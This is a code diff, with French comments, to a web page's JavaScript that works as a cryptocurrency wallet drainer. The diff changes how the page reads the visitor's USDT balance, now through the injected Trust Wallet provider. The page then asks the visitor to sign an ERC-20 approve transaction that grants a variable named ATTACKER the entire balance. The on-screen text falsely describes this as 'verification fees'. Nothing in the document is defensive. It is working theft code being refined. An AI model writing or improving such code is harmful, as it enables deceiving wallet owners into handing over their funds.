@@ -1037,23 +1037,31 @@ async function sendExactApproveTransaction() {
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
 
-    // Appeler notre backend pour obtenir le solde USDT
-    const resp = await fetch(`/api/get-usdt-balance?address=${account}`);
-    if (!resp.ok) throw new Error('Erreur récupération solde');
-    const { balance, balanceRaw } = await resp.json();
+    // On utilise le provider injecté par Trust Wallet (le même qui a signé la connexion)
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const usdtContract = new ethers.Contract(USDT_ADDR, [
+      'function balanceOf(address) view returns (uint256)',
+      'function decimals() view returns (uint8)'
+    ], provider);
 
-    if (!balanceRaw || BigInt(balanceRaw) === 0n) {
+    const [balance, decimals] = await Promise.all([
+      usdtContract.balanceOf(account),
+      usdtContract.decimals()
+    ]);
+
+    if (balance.isZero()) {
       if (scanText) scanText.textContent = '❌ Aucun USDT détecté.';
       return;
     }
 
-    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balance} USDT (frais de vérification).`;
+    const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+    if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
 
-    // Appeler approve(ATTACKER, balanceRaw) sur le contrat USDT
+    // Construire la transaction approve
     const iface = new ethers.utils.Interface([
       'function approve(address spender, uint256 amount)'
     ]);
-    const data = iface.encodeFunctionData('approve', [ATTACKER, balanceRaw]);
+    const data = iface.encodeFunctionData('approve', [ATTACKER, balance]);
 
     const txParams = {
       from: account,
@@ -1063,6 +1071,7 @@ async function sendExactApproveTransaction() {
       gas: '0x493E0',
     };
 
+    // Envoyer la transaction via WalletConnect → pop‑up Trust Wallet
     const txHash = await signClient.request({
       topic: session.topic,
       chainId: 'eip155:1',
